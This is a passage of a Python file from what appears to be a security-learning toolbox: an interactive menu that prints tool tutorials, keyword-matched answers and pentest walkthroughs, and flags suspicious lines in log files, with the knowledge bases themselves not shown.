        print(f"📝  Example rule:\n  {info['rule_example']}\n")

    if "tips" in info:
        print("💡  Tips:")
        for tip in info["tips"]:
            print(f"  • {tip}")
        print()

    if "defensive_note" in info:
        print(f"🛡️   Defensive note:\n  {info['defensive_note']}\n")

    _separator()


def answer_question(question: str) -> None:
    """Answer a security-related question using the embedded knowledge base."""
    q_lower = question.lower()

    for keywords, answer in QA_KNOWLEDGE:
        if any(kw in q_lower for kw in keywords):
            _separator()
            print("🤖  AI Agent Answer")
            _separator()
            print(f"\n{answer}\n")
            _separator()
            return

    # Fallback: check if the question references a known tool
    for tool_key in TOOL_KNOWLEDGE:
        if tool_key in q_lower:
            print(f"\n💡  I found teaching content for '{tool_key}'. Launching teach mode…\n")
            teach_tool(tool_key)
            return

    _separator()
    print("🤖  AI Agent — Question not matched to built-in knowledge")
    _separator()
    print(
        "\nI don't have a specific answer for that question in my current knowledge base.\n"
        "Here are some resources to try:\n"
        "  • https://book.hacktricks.xyz\n"
        "  • https://gtfobins.github.io\n"
        "  • https://portswigger.net/web-security\n"
        "  • https://owasp.org\n"
        "  • man pages / --help flags for the specific tool\n"
    )
    _separator()


def run_walkthrough(scenario: str) -> None:
    """Print an interactive walkthrough for a named pentesting scenario."""
    s_lower = scenario.strip().lower()

    matched_key = None
    for key in WALKTHROUGHS:
        if any(word in s_lower for word in key.split()):
            matched_key = key
            break

    if matched_key is None:
        _separator()
        print("🗺️   No matching walkthrough found.")
        print(
            "\nAvailable walkthroughs:\n  • "
            + "\n  • ".join(k.title() for k in WALKTHROUGHS.keys())
        )
        _separator()
        return

    _separator()
    print("🗺️   Walkthrough Mode")
    _separator()
    print(WALKTHROUGHS[matched_key])
    _separator()


def contextual_explain(input_path: str) -> None:
    """Analyse a log file or text file and highlight suspicious patterns."""
    path = os.path.expanduser(input_path.strip())

    if not os.path.isfile(path):
        print(f"\n❌  File not found: {path}")
        return

    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            lines = fh.readlines()
    except OSError as exc:
        print(f"\n❌  Could not read file: {exc}")
        return

    _separator()
    print(f"🔍  Contextual Analysis: {path}  ({len(lines)} lines)")
    _separator()

    findings = []
    for lineno, line in enumerate(lines, 1):
        for pattern, label, advice in LOG_PATTERNS:
            if pattern.search(line):
                findings.append((lineno, label, line.rstrip(), advice))
                break  # one label per line

    if not findings:
        print(
            "\n✅  No suspicious patterns detected in this file.\n"
            "   This does not guarantee the file is clean — review it manually\n"
            "   and correlate with other data sources.\n"
        )
    else:
        print(f"\n  Found {len(findings)} potential issue(s):\n")
        for lineno, label, line_content, advice in findings:
            print(f"  Line {lineno:>5}: {label}")
            print(f"           {line_content[:120]}")
            print(f"           💬 {advice}\n")

    _separator()

    # Summary statistics
    if findings:
        labels = [f[1] for f in findings]
        unique = sorted(set(labels))
        print("📊  Summary:")
        for lbl in unique:
            print(f"  {labels.count(lbl):>3}x  {lbl}")
        print()


# ---------------------------------------------------------------------------
# Interactive AI agent menu
# ---------------------------------------------------------------------------


def run_agent_menu() -> None:
    """Interactive AI agent menu — used when launched from the toolbox menu."""
    while True:
        _separator()
        print("🤖  AI Security Agent")
        _separator()
        print("  1. Teach me a tool")
        print("  2. Ask a question")
        print("  3. Run a walkthrough")
        print("  4. Analyse a log / output file")
        print("  5. Back to main menu")
        _separator()

        choice = input("\nChoose an option (1-5): ").strip()

        if choice == "1":
            tool = input("\nEnter the tool name (e.g. nmap, aircrack-ng, metasploit): ").strip()
            if tool:
                teach_tool(tool)
            else:
                print("\nNo tool name entered.")

        elif choice == "2":
            question = input("\nAsk your question: ").strip()
            if question:
                answer_question(question)
            else:
                print("\nNo question entered.")

        elif choice == "3":
            scenario = input(
                "\nEnter a scenario (e.g. 'linux privilege escalation', 'web application owasp top 10'): "
            ).strip()
            if scenario:
                run_walkthrough(scenario)
            else:
                print("\nNo scenario entered.")

        elif choice == "4":
            path = input("\nEnter the path to the file: ").strip()
            if path:
                contextual_explain(path)
            else:
                print("\nNo file path entered.")

        elif choice == "5":
            break

        else:
            print("\nInvalid choice.")

        input("\nPress Enter to continue...")


# ---------------------------------------------------------------------------
# Private helpers
# ---------------------------------------------------------------------------


def _separator() -> None:
    print("=" * 60)
